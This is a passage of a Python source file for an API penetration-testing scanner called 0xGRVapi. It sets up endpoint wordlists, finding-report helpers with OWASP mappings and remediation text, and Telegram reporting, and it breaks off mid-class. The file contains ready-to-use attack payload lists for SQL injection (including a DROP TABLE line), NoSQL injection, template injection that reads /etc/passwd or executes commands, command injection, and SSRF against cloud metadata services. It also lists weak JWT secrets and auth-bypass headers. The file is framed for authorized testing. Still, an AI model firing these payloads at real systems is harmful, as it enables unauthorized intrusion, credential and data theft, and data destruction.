#!/usr/bin/env python3
"""
╔═══════════════════════════════════════════════════════════════════════════════╗
║                                                                               ║
║   ██████╗ ██╗  ██╗ ██████╗ ██████╗ ██╗   ██╗ █████╗ ██████╗ ██╗               ║
║  ██╔═████╗╚██╗██╔╝██╔════╝ ██╔══██╗██║   ██║██╔══██╗██╔══██╗██║               ║
║  ██║██╔██║ ╚███╔╝ ██║  ███╗██████╔╝██║   ██║███████║██████╔╝██║               ║
║  ████╔╝██║ ██╔██╗ ██║   ██║██╔══██╗╚██╗ ██╔╝██╔══██║██╔═══╝ ██║               ║
║  ╚██████╔╝██╔╝ ██╗╚██████╔╝██║  ██║ ╚████╔╝ ██║  ██║██║     ██║               ║
║   ╚═════╝ ╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═╝  ╚═══╝  ╚═╝  ╚═╝╚═╝     ╚═╝               ║
║                                                                               ║
║   0xGRVapi  —  Elite API Security Reconnaissance Framework  v1.0              ║
║   BOLA  ·  Auth Bypass  ·  Rate Limit  ·  Mass Assignment  ·  SSRF            ║
║   Telegram Alerts  •  AI Analysis  •  Organized Output  •  80+ Checks         ║
║                                                                               ║
║   Author  : 0xgrv                                                             ║
║   GitHub  : https://github.com/0xgrv                                          ║
║   Usage   : python3 0xgrvapi.py -u https://api.target.com                     ║
║   Legal   : Authorized targets only. Written permission required.             ║
╚═══════════════════════════════════════════════════════════════════════════════╝
"""
import argparse, asyncio, json, os, re, shutil, subprocess, sys, time, urllib.parse, hashlib, base64
from datetime import datetime
from pathlib import Path
from typing import List, Dict, Optional, Set, Tuple, Any
from collections import defaultdict

# Auto-install deps
def _install_deps():
    pkgs = ["rich", "aiohttp", "aiofiles", "PyYAML"]
    missing = []
    for pkg in pkgs:
        imp = {"PyYAML": "yaml"}.get(pkg, pkg.lower().replace("-", "_"))
        try:
            __import__(imp)
        except ImportError:
            missing.append(pkg)

    if not missing:
        return  # all present

    print(f"[*] Installing missing packages: {', '.join(missing)}")
    installed = False
    for flags in [
        ["--break-system-packages", "-q"],
        ["--user", "-q"],
        ["-q"],
    ]:
        r = subprocess.run(
            [sys.executable, "-m", "pip", "install"] + missing + flags,
            capture_output=True)
        if r.returncode == 0:
            installed = True
            break

    if not installed:
        print("[!] Auto-install failed. Run manually:")
        print(f"    pip install {' '.join(missing)} --break-system-packages")
        sys.exit(1)

    print("[*] Packages installed — restarting...\n")
    os.execv(sys.executable, [sys.executable] + sys.argv)

_install_deps()

from rich.console import Console
from rich.panel import Panel
from rich.table import Table
from rich.rule import Rule
from rich.progress import Progress, SpinnerColumn, TextColumn
from rich import box
import aiohttp, aiofiles, yaml

console = Console()
VERSION = "1.0"

class OutputDirs:
    def __init__(self, target_name: str, base: str = "."):
        self.root        = Path(base) / target_name
        self.report      = self.root / "00_REPORT"
        self.discovery   = self.root / "01_discovery"
        self.endpoints   = self.discovery / "endpoints"
        self.spec        = self.discovery / "spec_files"
        self.auth        = self.root / "02_authentication"
        self.authz       = self.root / "03_authorization"
        self.bola        = self.authz / "bola_idor"
        self.privesc     = self.authz / "priv_escalation"
        self.ratelimit   = self.root / "04_rate_limiting"
        self.injection   = self.root / "05_injection"
        self.sqli        = self.injection / "sqli"
        self.nosqli      = self.injection / "nosqli"
        self.ssti        = self.injection / "ssti"
        self.cmdi        = self.injection / "command_injection"
        self.mass_assign = self.root / "06_mass_assignment"
        self.ssrf        = self.root / "07_ssrf"
        self.headers     = self.root / "08_security_headers"
        self.info_leak   = self.root / "09_info_leakage"
        self.business    = self.root / "10_business_logic"
        self.transport   = self.root / "11_transport_security"
        self.logs        = self.root / "logs"

    def create(self):
        for d in vars(self).values():
            if isinstance(d, Path):
                d.mkdir(parents=True, exist_ok=True)
        return self

def _which(tool: str) -> Optional[str]:
    p = shutil.which(tool)
    return p if p else None

def _resolve_wordlist(candidates: List[str]) -> Optional[str]:
    for p in candidates:
        if Path(p).exists():
            return p
    return None

# Kali / SecLists / common wordlist paths (priority order)
# ffuf / feroxbuster endpoint wordlists
WL_API_ENDPOINTS = _resolve_wordlist([
    "/usr/share/seclists/Discovery/Web-Content/api/objects.txt",
    "/usr/share/seclists/Discovery/Web-Content/common-api-endpoints-mazen160.txt",
    "/usr/share/seclists/Discovery/Web-Content/api/api-endpoints.txt",
    "/usr/share/seclists/Discovery/Web-Content/raft-large-words.txt",
    "/usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt",
    "/usr/share/wordlists/dirb/common.txt",
    "/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt",
    "/opt/SecLists/Discovery/Web-Content/api/objects.txt",
    "/opt/SecLists/Discovery/Web-Content/common-api-endpoints-mazen160.txt",
])

WL_PARAMS = _resolve_wordlist([
    "/usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt",
    "/usr/share/seclists/Discovery/Web-Content/raft-large-parameters.txt",
    "/usr/share/arjun/db/large.txt",
    "/usr/lib/python3/dist-packages/arjun/db/large.txt",
    "/opt/SecLists/Discovery/Web-Content/burp-parameter-names.txt",
])

WL_KR_ROUTES = _resolve_wordlist([
    "/usr/share/kiterunner/routes-large.kite",
    "/usr/share/kiterunner/routes-small.kite",
    "/opt/kiterunner/routes-large.kite",
    "/opt/routes-large.kite",
    "~/routes-large.kite",
])

WL_PASSWORDS = _resolve_wordlist([
    "/usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-1000.txt",
    "/usr/share/seclists/Passwords/Common-Credentials/best110.txt",
    "/usr/share/wordlists/rockyou.txt",
    "/usr/share/seclists/Passwords/Leaked-Databases/rockyou-75.txt",
])

# Detect installed tools
TOOL_FFUF        = _which("ffuf")
TOOL_ARJUN       = _which("arjun")
TOOL_KR          = _which("kr")          # kiterunner
TOOL_FEROX       = _which("feroxbuster")
TOOL_NIKTO       = _which("nikto")
TOOL_NUCLEI      = _which("nuclei")
TOOL_JWT_TOOL    = _which("jwt_tool")

API_PATHS = [
    # Core REST patterns
    "/api", "/api/v1", "/api/v2", "/api/v3", "/api/v4",
    "/v1", "/v2", "/v3", "/v4",
    "/rest", "/rest/v1", "/rest/v2",
    "/graphql", "/graphiql", "/__graphql", "/graphql/playground",
    "/grpc", "/rpc",

    # Auth endpoints
    "/api/v1/auth", "/api/v1/login", "/api/v1/register", "/api/v1/signup",
    "/api/v1/logout", "/api/v1/token", "/api/v1/refresh", "/api/v1/oauth",
    "/api/v1/oauth/token", "/api/v1/oauth/authorize", "/api/v1/auth/token",
    "/api/v1/session", "/api/v1/sessions", "/api/v1/2fa", "/api/v1/mfa",
    "/api/v1/forgot-password", "/api/v1/reset-password", "/api/v1/verify-email",
    "/auth", "/login", "/logout", "/register", "/signup", "/token", "/oauth",
    "/oauth/token", "/oauth2/token", "/oauth/authorize", "/connect/token",
    "/identity/connect/token", "/.well-known/openid-configuration",
    "/.well-known/oauth-authorization-server",

    # User/Account endpoints
    "/api/v1/users", "/api/v1/user", "/api/v1/me", "/api/v1/profile",
    "/api/v1/account", "/api/v1/accounts", "/api/v1/settings",
    "/api/v1/password", "/api/v1/email",
    "/users", "/user", "/me", "/profile", "/account", "/accounts",

    # Admin endpoints
    "/api/v1/admin", "/api/v1/admin/users", "/api/v1/admin/dashboard",
    "/api/v1/admin/settings", "/api/v1/admin/logs", "/api/v1/admin/stats",
    "/admin", "/admin/api", "/administrator", "/manage", "/management",
    "/api/admin", "/api/internal", "/internal", "/internal/api",
    "/api/v1/internal", "/api/v1/private", "/private", "/api/private",

    # Data endpoints
    "/api/v1/data", "/api/v1/export", "/api/v1/import", "/api/v1/upload",
    "/api/v1/download", "/api/v1/files", "/api/v1/documents",
    "/api/v1/reports", "/api/v1/analytics", "/api/v1/stats", "/api/v1/metrics",
    "/api/v1/logs", "/api/v1/audit", "/api/v1/events",

    # Resource endpoints
    "/api/v1/orders", "/api/v1/products", "/api/v1/customers",
    "/api/v1/payments", "/api/v1/invoices", "/api/v1/subscriptions",
    "/api/v1/transactions", "/api/v1/billing", "/api/v1/plans",
    "/api/v1/items", "/api/v1/posts", "/api/v1/comments",
    "/api/v1/messages", "/api/v1/notifications", "/api/v1/feeds",
    "/api/v1/search", "/api/v1/categories", "/api/v1/tags",
    "/api/v1/roles", "/api/v1/permissions", "/api/v1/groups", "/api/v1/teams",
    "/api/v1/organizations", "/api/v1/workspaces", "/api/v1/projects",

    # Debug/Info endpoints
    "/health", "/healthz", "/_health", "/health/check", "/ping", "/status",
    "/_status", "/ready", "/readyz", "/live", "/livez",
    "/debug", "/debug/vars", "/debug/pprof", "/__debug",
    "/actuator", "/actuator/health", "/actuator/env", "/actuator/beans",
    "/actuator/mappings", "/actuator/metrics", "/actuator/logfile",
    "/actuator/heapdump", "/actuator/threaddump", "/actuator/httptrace",
    "/metrics", "/prometheus", "/telemetry",
    "/version", "/info", "/_info", "/build", "/build-info",
    "/swagger", "/swagger.json", "/swagger.yaml", "/swagger-ui",
    "/swagger-ui.html", "/swagger-ui/", "/swagger/index.html",
    "/openapi.json", "/openapi.yaml", "/openapi/v1", "/openapi/v2",
    "/api-docs", "/api-docs.json", "/api/swagger.json",
    "/api/v1/swagger.json", "/docs", "/redoc", "/rapidoc",
    "/api/schema", "/api/schema.json", "/schema.json",
    "/.well-known/api", "/.well-known/security.txt",
    "/robots.txt", "/sitemap.xml",

    # Config/Sensitive
    "/.env", "/config", "/config.json", "/configuration",
    "/api/v1/config", "/api/v1/configuration",
    "/api/v1/keys", "/api/v1/credentials",

    # GraphQL introspection
    "/graphql?query={__schema{types{name}}}",
    "/api/graphql", "/api/v1/graphql",
]

HTTP_METHODS = ["GET", "POST", "PUT", "PATCH", "DELETE", "OPTIONS", "HEAD",
                "TRACE", "CONNECT", "PROPFIND", "PROPPATCH", "MKCOL",
                "COPY", "MOVE", "LOCK", "UNLOCK"]

BOLA_IDS = [
    "1", "2", "3", "100", "999", "1337",
    "0", "-1", "null", "undefined", "none",
    "00000000-0000-0000-0000-000000000001",
    "00000000-0000-0000-0000-000000000002",
    "aaaaaaaa-bbbb-cccc-dddd-eeeeeeeeeeee",
    "../1", "../../1", "%2e%2e%2f1",
    "me", "admin", "self", "current",
]

WEAK_JWT_SECRETS = [
    "secret", "password", "123456", "admin", "key", "jwt",
    "your-256-bit-secret", "changeme", "test", "dev", "development",
    "production", "supersecret", "mysecret", "abc123", "qwerty",
    "0000000000000000", "secretkey", "jwttoken", "apikey",
    "your-secret-key", "SECRET_KEY", "JWT_SECRET",
]

SQLI_PAYLOADS = [
    "'", "''", "`", "\"", "\\", ";",
    "' OR '1'='1", "' OR 1=1--", "' OR 1=1#",
    "1' ORDER BY 1--", "1' UNION SELECT NULL--",
    "' AND 1=2 UNION SELECT 1,2,3--",
    "1; DROP TABLE users--",
    "' OR SLEEP(5)--", "' OR pg_sleep(5)--",
    "'; WAITFOR DELAY '0:0:5'--",
    "1' AND (SELECT * FROM (SELECT(SLEEP(5)))x)--",
]

NOSQLI_PAYLOADS = [
    '{"$gt": ""}', '{"$ne": null}', '{"$nin": []}',
    '{"$regex": ".*"}', '{"$where": "1==1"}',
    '{"$gt": 0}', '{"$ne": 0}', '{"$exists": true}',
    '[$ne]=1', '[$gt]=', '[$regex]=.*',
    '{"username": {"$ne": null}, "password": {"$ne": null}}',
]

SSTI_PAYLOADS = [
    "{{7*7}}", "${7*7}", "#{7*7}", "<%= 7*7 %>",
    "{{7*'7'}}", "{{''.class.mro[2].subclasses()[40]('/etc/passwd').read()}}",
    "{{config}}", "{{self}}", "${T(java.lang.Runtime).getRuntime().exec('id')}",
    "{{request.environ}}", "{{lipsum.__globals__}}",
    "{% for x in ().__class__.__base__.__subclasses__() %}{% endfor %}",
]

CMDI_PAYLOADS = [
    ";id", "|id", "&&id", "||id",
    ";sleep 5", "|sleep 5", "&&sleep 5",
    "$(id)", "`id`", "$(sleep 5)",
    ";ls /", "|cat /etc/passwd",
    "%0aid", "%0a%0did", "\nid",
    ";ping -c 5 127.0.0.1",
]

SSRF_PAYLOADS = [
    "http://127.0.0.1", "http://localhost",
    "http://169.254.169.254", "http://169.254.169.254/latest/meta-data/",
    "http://169.254.169.254/latest/user-data/",
    "http://metadata.google.internal/",
    "http://metadata.google.internal/computeMetadata/v1/",
    "http://100.100.100.200/latest/meta-data/",
    "http://192.168.0.1", "http://10.0.0.1",
    "http://0.0.0.0", "http://[::1]",
    "http://2130706433",  # 127.0.0.1 decimal
    "http://0x7f000001",  # 127.0.0.1 hex
    "dict://127.0.0.1:6379/", "gopher://127.0.0.1:6379/_",
    "file:///etc/passwd",
    "http://169.254.169.254.xip.io/",
]

MASS_ASSIGN_FIELDS = [
    "role", "admin", "is_admin", "isAdmin", "is_superuser",
    "superuser", "staff", "is_staff", "verified", "is_verified",
    "active", "is_active", "approved", "is_approved",
    "balance", "credit", "wallet", "premium", "subscription",
    "price", "discount", "tax", "free",
    "permissions", "scopes", "access_level", "privilege",
    "user_id", "userId", "account_id", "accountId", "owner_id",
    "email", "password", "token", "secret",
    "created_at", "updated_at", "deleted_at",
    "_id", "__v", "_admin", "_role",
]

SECURITY_HEADERS = {
    "Strict-Transport-Security": {"expected": "max-age=", "sev": "LOW",  "desc": "HSTS missing — relevant on HTTPS targets"},
    "Content-Security-Policy":   {"expected": None,       "sev": "INFO", "desc": "CSP absent — mainly relevant for browser-facing APIs"},
    "X-Content-Type-Options":    {"expected": "nosniff",  "sev": "INFO", "desc": "MIME sniffing — low impact on JSON APIs"},
    "X-Frame-Options":           {"expected": None,       "sev": "INFO", "desc": "Clickjacking — low impact on pure APIs"},
    "X-XSS-Protection":          {"expected": None,       "sev": "INFO", "desc": "Legacy XSS filter not set"},
    "Cache-Control":             {"expected": "no-store", "sev": "LOW",  "desc": "Sensitive API responses may be cached"},
    "Referrer-Policy":           {"expected": None,       "sev": "INFO", "desc": "Referrer header leakage possible"},
    "Permissions-Policy":        {"expected": None,       "sev": "INFO", "desc": "Permissions policy not set"},
    "Access-Control-Allow-Origin":{"expected": None,      "sev": "INFO", "desc": "CORS — tested separately in CORS phase"},
    "X-RateLimit-Limit":         {"expected": None,       "sev": "INFO", "desc": "No rate limit headers — check rate limit phase"},
    "X-Powered-By":              {"expected": None,       "sev": "INFO", "desc": "Tech stack exposed in headers"},
    "Server":                    {"expected": None,       "sev": "INFO", "desc": "Server version exposed"},
}

INFO_LEAK_PATTERNS = {
    "Stack Trace (Java)": r'at\s+[\w.]+\([\w.]+\.java:\d+\)',
    "Stack Trace (Python)": r'Traceback\s+\(most recent call last\)',
    "Stack Trace (PHP)": r'Fatal error:.*on line \d+',
    "Stack Trace (Ruby)": r'gems/[\w-]+/lib/',
    "Stack Trace (.NET)": r'System\.\w+Exception:',
    "SQL Error (MySQL)": r"You have an error in your SQL syntax",
    "SQL Error (PostgreSQL)": r'ERROR:.*syntax error at or near',
    "SQL Error (MSSQL)": r'Microsoft OLE DB Provider for SQL Server',
    "SQL Error (Oracle)": r'ORA-\d{5}:',
    "MongoDB Error": r'MongoError|MongoServerError|MongoNetworkError',
    "Redis Error": r'WRONGTYPE Operation against a key',
    "AWS Key in Response": r'AKIA[0-9A-Z]{16}',
    "Private Key Leak": r'-----BEGIN (RSA |EC |OPENSSH )?PRIVATE KEY-----',
    "JWT in Response": r'eyJ[a-zA-Z0-9_-]+\.[a-zA-Z0-9_-]+\.[a-zA-Z0-9_-]+',
    "Internal IP": r'(?:10|172\.(?:1[6-9]|2[0-9]|3[01])|192\.168)\.\d{1,3}\.\d{1,3}',
    "Email Leak": r'[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}',
    "Path Disclosure": r'(?:/home/|/var/www/|C:\\|/usr/local/)',
    "Version Info": r'"version"\s*:\s*"[\d.]+(?:-[a-zA-Z0-9.]+)?"',
    "Debug Info": r'"debug"\s*:\s*true',
    "Environment Vars": r'"(?:NODE_ENV|RAILS_ENV|APP_ENV|DJANGO_SETTINGS_MODULE)"\s*:',
    "API Key Pattern": r'(?i)(?:api[_-]?key|apikey|api_secret)\s*[=:]\s*["\'][a-zA-Z0-9_\-]{20,}["\']',
    "Password in JSON": r'"(?:password|passwd|pwd|secret)"\s*:\s*"[^"]{6,}"',
    "Base64 Secret": r'"[A-Za-z0-9+/]{40,}={0,2}"',
    "GraphQL Errors": r'"errors"\s*:\s*\[.*?"message"',
    "Verbose Error": r'"(?:error|message|detail|msg)"\s*:\s*"[^"]{50,}"',
    "CORS Wildcard": r'Access-Control-Allow-Origin: \*',
    "Server Banner": r'(?:Apache|nginx|IIS|Express|Gunicorn|uWSGI)/[\d.]+',
}

GRAPHQL_INTROSPECTION = """
{
  __schema {
    types {
      name
      kind
      description
      fields {
        name
        description
        args { name type { name kind ofType { name kind } } }
        type { name kind ofType { name kind } }
      }
    }
    queryType { name }
    mutationType { name }
    subscriptionType { name }
  }
}
"""

GRAPHQL_QUERIES = [
    '{"query":"{__schema{types{name}}}"}',
    '{"query":"{__typename}"}',
    '{"query":"query IntrospectionQuery{__schema{queryType{name}mutationType{name}subscriptionType{name}types{...FullType}directives{name description locations args{...InputValue}}}}fragment FullType on __Type{kind name description fields(includeDeprecated:true){name description args{...InputValue}type{...TypeRef}isDeprecated deprecationReason}inputFields{...InputValue}interfaces{...TypeRef}enumValues(includeDeprecated:true){name description isDeprecated deprecationReason}possibleTypes{...TypeRef}}fragment InputValue on __InputValue{name description type{...TypeRef}defaultValue}fragment TypeRef on __Type{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name}}}}}}}}"}',
]

RATE_LIMIT_BYPASS_HEADERS = [
    {"X-Forwarded-For": "127.0.0.1"},
    {"X-Real-IP": "127.0.0.1"},
    {"X-Originating-IP": "127.0.0.1"},
    {"X-Client-IP": "127.0.0.1"},
    {"X-Remote-IP": "127.0.0.1"},
    {"True-Client-IP": "127.0.0.1"},
    {"CF-Connecting-IP": "127.0.0.1"},
    {"X-Cluster-Client-IP": "127.0.0.1"},
    {"Forwarded": "for=127.0.0.1;proto=https"},
    {"X-Forwarded-For": "::1"},
    {"X-Host": "127.0.0.1"},
    {"X-Custom-IP-Authorization": "127.0.0.1"},
]

AUTH_BYPASS_HEADERS = [
    {"Authorization": "null"},
    {"Authorization": "undefined"},
    {"Authorization": "Bearer null"},
    {"Authorization": "Bearer undefined"},
    {"Authorization": "Bearer admin"},
    {"Authorization": "Bearer "},
    {"X-API-Key": "null"},
    {"X-API-Key": "admin"},
    {"X-API-Key": ""},
    {"X-Auth-Token": "null"},
    {"X-Auth-Token": "admin"},
    {"X-Access-Token": "null"},
    {"X-User-Id": "1"},
    {"X-User-Id": "admin"},
    {"X-Admin": "true"},
    {"X-Original-URL": "/admin"},
    {"X-Rewrite-URL": "/admin"},
    {"X-Override-URL": "/admin"},
]

PARAM_POLLUTION = [
    "?admin=true", "?role=admin", "?debug=true",
    "?test=true", "?bypass=1", "?internal=1",
    "?format=json", "?callback=test", "?_method=PUT",
    "?X-HTTP-Method-Override=DELETE",
]

async def run(cmd: str, timeout: int = 60) -> tuple:
    try:
        p = await asyncio.create_subprocess_shell(
            cmd, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE)
        o, e = await asyncio.wait_for(p.communicate(), timeout=timeout)
        return p.returncode, o.decode(errors="ignore").strip(), e.decode(errors="ignore").strip()
    except asyncio.TimeoutError:
        return -1, "", f"TIMEOUT {timeout}s"
    except Exception as ex:
        return -1, "", str(ex)

def safe_name(url: str) -> str:
    return re.sub(r'[^a-zA-Z0-9_.-]', '_', url)[:80]

def wfile(p: Path, content: str):
    p.write_text(content)

def afile(p: Path, text: str):
    with open(p, "a") as f:
        f.write(text + "\n")

def sjson(p: Path, data):
    with open(p, "w") as f:
        json.dump(data, f, indent=2, default=str)

def lc(p: Path) -> int:
    if not p or not p.exists(): return 0
    with open(p, "r", errors="ignore") as f:
        return sum(1 for l in f if l.strip())

def rlines(p: Path) -> List[str]:
    if not p or not p.exists(): return []
    with open(p, "r", errors="ignore") as f:
        return [l.strip() for l in f if l.strip()]

def pb(num, name):
    console.print()
    console.print(f"[dim]{'─'*60}[/dim]")
    console.print(f"  [bold white][ {num:>3} ][/bold white]  [bold cyan]{name}[/bold cyan]")
    console.print(f"[dim]{'─'*60}[/dim]")

def ok(m):   console.print(f"  [green]+[/green]  {m}")
def inf(m):  console.print(f"  [dim]>[/dim]  [dim]{m}[/dim]")
def warn(m): console.print(f"  [yellow]![/yellow]  [yellow]{m}[/yellow]")
def err(m):  console.print(f"  [red]-[/red]  {m}")
def crit(m): console.print(f"  [bold red][CRITICAL][/bold red]  [red]{m}[/red]")

def build_poc_curl(finding: dict, client_headers: dict = None) -> str:
    """Generate a curl command that reproduces the finding. Shown in report + terminal."""
    url     = finding.get("url","") or finding.get("detail","")
    method  = finding.get("method","GET").upper()
    body    = finding.get("poc_body","")
    headers = client_headers or {}

    # strip internal-only headers that would confuse the reader
    skip = {"user-agent","accept-encoding","accept-language",
            "sec-fetch-site","sec-fetch-mode","sec-fetch-dest",
            "sec-ch-ua","sec-ch-ua-mobile","sec-ch-ua-platform",
            "priority","referer","origin"}

    hdr_parts = []
    for k, v in headers.items():
        if k.lower() not in skip:
            # mask tokens partially for client-safe output
            if k.lower() == "authorization" and len(v) > 40:
                display_v = v[:30] + "...<TOKEN>"
            else:
                display_v = v
            hdr_parts.append(f"  -H '{k}: {display_v}'")

    hdr_str = " \
".join(hdr_parts)
    method_flag = "" if method == "GET" else f" \
  -X {method}"
    body_flag   = f" \
  -d '{json.dumps(body)}' \
  -H 'Content-Type: application/json'" if body else ""

    cmd = f"curl -sk{method_flag} \
  '{url}'"
    if hdr_str:
        cmd += f" \
{hdr_str}"
    if body_flag:
        cmd += body_flag

    return cmd

def enrich_finding(finding: dict, client_headers: dict = None) -> dict:
    """Attach PoC curl, remediation, and OWASP category to every finding."""
    ftype = finding.get("type","").lower()

    # OWASP API Top 10 mapping
    owasp_map = {
        "bola": "API1:2023 — Broken Object Level Authorization",
        "idor": "API1:2023 — Broken Object Level Authorization",
        "mass assignment": "API3:2023 — Broken Object Property Level Authorization",
        "auth": "API2:2023 — Broken Authentication",
        "jwt": "API2:2023 — Broken Authentication",
        "rate limit": "API4:2023 — Unrestricted Resource & Rate Limiting",
        "ssrf": "API7:2023 — Server Side Request Forgery",
        "inject": "API8:2023 — Security Misconfiguration",
        "sqli": "API8:2023 — Security Misconfiguration",
        "nosql": "API8:2023 — Security Misconfiguration",
        "cors": "API8:2023 — Security Misconfiguration",
        "info leak": "API3:2023 — Broken Object Property Level Authorization",
        "header": "API8:2023 — Security Misconfiguration",
    }
    owasp = "API10:2023 — Unsafe Consumption of APIs"
    for kw, cat in owasp_map.items():
        if kw in ftype:
            owasp = cat
            break

    # Remediation map
    remed_map = {
        "bola": "Validate that the authenticated user owns the requested resource. Enforce object-level authorization on every endpoint that receives a resource ID.",
        "idor": "Validate that the authenticated user owns the requested resource. Enforce object-level authorization on every endpoint that receives a resource ID.",
        "mass assignment": "Use an explicit allowlist of accepted fields per endpoint. Never bind request body directly to internal models. Strip unexpected fields server-side.",
        "auth": "Enforce authentication on all non-public endpoints. Validate token signature, expiry, and audience on every request.",
        "jwt": "Validate JWT signature with the correct algorithm. Reject tokens with alg:none. Check expiry, issuer, and audience claims.",
        "rate limit": "Implement per-user and per-IP rate limiting on all endpoints. Return 429 with Retry-After header when limits are exceeded.",
        "ssrf": "Validate and allowlist URLs before making server-side requests. Block requests to internal IP ranges (169.254.x.x, 10.x.x.x, etc).",
        "cors": "Set Access-Control-Allow-Origin to specific trusted origins. Never reflect the Origin header back without validation.",
        "header": "Configure security headers on all responses. Do not expose server version or internal framework headers.",
        "info leak": "Suppress detailed error messages in production. Do not return stack traces, internal paths, or sensitive data in API responses.",
    }
    remediation = "Review the vulnerability class and apply appropriate input validation, access controls, and output filtering."
    for kw, rem in remed_map.items():
        if kw in ftype:
            remediation = rem
            break

    finding["owasp"]       = owasp
    finding["remediation"] = remediation
    finding["poc_curl"]    = build_poc_curl(finding, client_headers)
    return finding

# dedup + validation

_SEEN_FINDINGS: set = set()  # global dedup set across all phases

def _finding_key(f: dict) -> str:
    """Canonical key for dedup — type + url + param/field."""
    return "|".join([
        f.get("type","").lower().strip(),
        f.get("url","").split("?")[0].rstrip("/"),  # ignore query string
        str(f.get("param","") or f.get("field","")).lower(),
    ])

def validate_finding(f: dict) -> bool:
    """
    Returns True only if the finding is credible and not a duplicate.
    This is the single gate everything passes through.
    """
    # Must have a type and a URL or detail
    if not f.get("type"): return False
    if not f.get("url") and not f.get("detail"): return False

    # Dedup
    key = _finding_key(f)
    if key in _SEEN_FINDINGS: return False
    _SEEN_FINDINGS.add(key)

    return True

def safe_finding(f: dict, client_headers: dict = None) -> Optional[dict]:
    """Enrich + validate. Returns None if finding is a dupe or invalid."""
    f = enrich_finding(f, client_headers)
    if not validate_finding(f): return None
    return f

class TelegramNotifier:
    def __init__(self, bot_token: str, chat_id: str):
        self.bot_token  = bot_token
        self.chat_id    = chat_id.strip() if chat_id else ""
        self.api_base   = f"https://api.telegram.org/bot{bot_token}"
        self.enabled    = bool(bot_token and chat_id)
        self._findings: List[Dict] = []   # queued findings, sent all at once at end

    # Internal HTTP helper
    async def _post(self, endpoint: str, **kwargs) -> bool:
        if not self.enabled:
            return False
        try:
            async with aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(total=15)) as s:
                async with s.post(f"{self.api_base}/{endpoint}", **kwargs) as r:
                    if r.status != 200:
                        body = await r.text()
                        console.print(f"  [dim]Telegram {endpoint} error {r.status}: {body[:100]}[/dim]")
                    return r.status == 200
        except Exception as ex:
            console.print(f"  [dim]Telegram error: {ex}[/dim]")
            return False

    async def send(self, message: str, parse_mode: str = "HTML") -> bool:
        return await self._post("sendMessage", json={
            "chat_id": self.chat_id,
            "text": message[:4096],
            "parse_mode": parse_mode,
            "disable_web_page_preview": True,
        })

    # Queue a finding — sent all at once in final summary
    def queue_finding(self, severity: str, title: str, detail: str):
        self._findings.append({"sev": severity, "title": title, "detail": detail})

    async def send_finding(self, severity: str, title: str, detail: str, target: str):
        self.queue_finding(severity, title, detail)

    async def send_phase_start(self, phase: str, target: str):
        pass   # suppressed — no per-phase messages

    # Message 1: scan started
    async def send_start(self, target: str, spec_file: str = None, phases: List[str] = None):
        lines = [
            "<b>0xGRVapi — Scan Started</b>",
            "",
            f"Target: <code>{target}</code>",
            f"Time  : {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}",
        ]
        if spec_file:
            lines.append(f"Spec  : {Path(spec_file).name}")
        if phases:
            lines.append(f"Phases: {', '.join(phases)}")
        await self.send("\n".join(lines))

    # Message 2: final summary + HTML file
    async def send_final(self, stats: dict, target: str,
                         all_findings: List[Dict], report_path: str, elapsed: float):
        if not self.enabled:
            return

        by_sev: Dict[str, List] = defaultdict(list)
        for f in all_findings:
            by_sev[f.get("sev", "INFO")].append(f)

        crits  = len(by_sev.get("CRITICAL", []))
        highs  = len(by_sev.get("HIGH", []))
        meds   = len(by_sev.get("MEDIUM", []))
        lows   = len(by_sev.get("LOW", []))

        lines = [
            "<b>0xGRVapi — Scan Complete</b>",
            "",
            f"Target   : <code>{target}</code>",
            f"Duration : {elapsed:.0f}s ({elapsed/60:.1f} min)",
            f"Time     : {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}",
            "",
            "<b>Results</b>",
            f"  Endpoints   : {stats.get('endpoints_found', 0)}",
            f"  Spec files  : {stats.get('spec_files', 0)}",
            f"  Total       : {len(all_findings)} findings",
            "",
            "<b>Severity Breakdown</b>",
            f"  CRITICAL : {crits}",
            f"  HIGH     : {highs}",
            f"  MEDIUM   : {meds}",
            f"  LOW      : {lows}",
            "",
            "<b>By Category</b>",
            f"  Auth issues     : {stats.get('auth_issues', 0)}",
            f"  BOLA/IDOR       : {stats.get('bola_findings', 0)}",
            f"  Injections      : {stats.get('injection_findings', 0)}",
            f"  Mass Assignment : {stats.get('mass_assignment_findings', 0)}",
            f"  SSRF            : {stats.get('ssrf_findings', 0)}",
            f"  Headers/CORS    : {stats.get('header_findings', 0)}",
            f"  Info Leaks      : {stats.get('info_leak_findings', 0)}",
        ]

        # Top critical/high findings detail
        top = [f for f in all_findings if f.get("sev") in ["CRITICAL", "HIGH"]][:8]
        if top:
            lines.append("")
            lines.append("<b>Top Findings</b>")
            for f in top:
                sev   = f.get("sev", "")
                title = f.get("type", "Finding")
                url   = f.get("url", f.get("detail", ""))[:80]
                lines.append(f"  [{sev}] {title}")
                if url:
                    lines.append(f"    {url}")

        await self.send("\n".join(lines))

        # Send HTML report as a document
        try:
            rp = Path(report_path)
            if rp.exists():
                async with aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(total=60)) as s:
                    with open(rp, "rb") as fh:
                        form = aiohttp.FormData()
                        form.add_field("chat_id", self.chat_id)
                        form.add_field("document", fh,
                                       filename="0xGRVapi_report.html",
                                       content_type="text/html")
                        form.add_field("caption", f"Full report — {target}")
                        async with s.post(f"{self.api_base}/sendDocument",
                                          data=form) as r:
                            if r.status == 200:
                                ok("Report sent to Telegram")
                            else:
                                body = await r.text()
                                warn(f"Telegram document send failed: {body[:100]}")
        except Exception as ex:
            warn(f"Could not send report to Telegram: {ex}")

    async def send_summary(self, stats: dict, target: str, report_path: str):
        pass   # replaced by send_final in main()

class APIClient:
    DEFAULT_HEADERS = {
        "User-Agent": "Mozilla/5.0 (compatible; API-Recon/1.0; Security Research)",
        "Accept": "application/json, text/plain, */*",
        "Accept-Language": "en-US,en;q=0.9",
        "Content-Type": "application/json",
    }

    def __init__(self, base_url: str, token: str = None, api_key: str = None,
                 extra_headers: dict = None, timeout: int = 15,
                 refresher: "TokenRefresher" = None):
